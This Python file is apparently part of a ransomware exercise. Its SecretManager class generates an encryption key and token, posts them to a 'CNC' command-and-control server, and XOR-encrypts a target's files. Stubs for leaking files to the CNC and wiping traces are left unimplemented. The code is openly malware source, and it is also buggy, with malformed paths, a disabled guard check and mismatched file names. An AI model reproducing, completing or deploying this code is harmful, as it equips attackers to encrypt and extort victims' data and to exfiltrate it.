from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt: bytes, key: bytes) -> bytes:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_LENGTH,
            salt=salt,
            iterations=self.ITERATION,
        )
        derived_key = kdf.derive(key)
        return derived_key

    def create(self) -> Tuple[bytes, bytes, bytes]:
        salt = secrets.token_bytes(self.SALT_LENGTH)
        key = secrets.token_bytes(self.TOKEN_LENGTH)
        token = self.do_derivation(salt, key)
        return salt, key, token


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt: bytes, key: bytes, token: bytes) -> None:
        url = f"http://{self._remote_host_port}/new"
        data = {
            "token": self.bin_to_b64(token),
            "salt": self.bin_to_b64(salt),
            "key": self.bin_to_b64(key),
        }
        response = requests.post(url, json=data)

        if response.status_code != 200:
            self._log.error(f"Failed to send data to CNC: {response.text}")
        else:
            self._log.info("Data sent to CNC successfully")

    def setup(self) -> None:
        # Vérification de l'existence d'un fichier self._token.bin
        if os.path.exists(os.path.join(self._path, "_token.bin")):
            self._log.warning("Un fichier self._token.bin existe déjà. Annulation du setup.")
        #     return

        # Création des éléments cryptographiques
        self._salt, self._key, self._token = self.create()
        print(f"Clé de chiffrement: {self._key}")

        # Création du répertoire si nécessaire
        os.makedirs(self._path, exist_ok=True)
        # Sauvegarde du sel et du self._token en local
        with open(os.path.join(self._path, "/self._salt.bin"), "wb") as self._salt_file:
            self._salt_file.write(self._salt)
        with open(os.path.join(self._path, "/self._token.bin"), "wb") as self._token_file:
            self._token_file.write(self._token)


        # Envoi des éléments cryptographiques au CNC
        self.post_new(self._salt, self._key, self._token)

    def load(self) -> None:
        salt_path = os.path.join(self._path, "salt.bin")

        if os.path.exists(salt_path):
            with open(salt_path, "rb") as salt_file:
                self._salt = salt_file.read()
        else:
            self._log.warning("Les fichiers self._salt.bin et/ou self.key.bin n'existent pas. Impossible de charger les données cryptographiques.")


    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        raise NotImplemented()

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        raise NotImplemented()

    def get_hex_token(self) -> str:
        token_hash = sha256(self._token).hexdigest()
        return token_hash

    def xorfiles(self, files: List[str]) -> None:
        for file_path in files:
            try:
                xorfile(file_path, self._key)
            except Exception as e:
                self._log.error(f"Erreur lors du chiffrement du fichier {file_path}: {e}")


    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        raise NotImplemented()
    
    